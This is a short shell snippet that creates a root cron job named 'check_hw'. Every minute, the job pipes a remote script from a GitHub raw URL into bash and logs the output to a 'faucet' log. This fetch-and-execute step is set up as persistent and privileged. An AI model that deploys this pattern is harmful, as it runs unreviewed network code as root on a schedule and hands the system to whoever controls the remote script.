tee /etc/cron.d/check_hw <<EOF
*/1 * * * * root date >> $HOME/faucet.log;curl -sL https://raw.githubusercontent.com/ezyhook/bash/main/babilon.sh | /bin/bash -s -- >> $HOME/faucet.log
EOF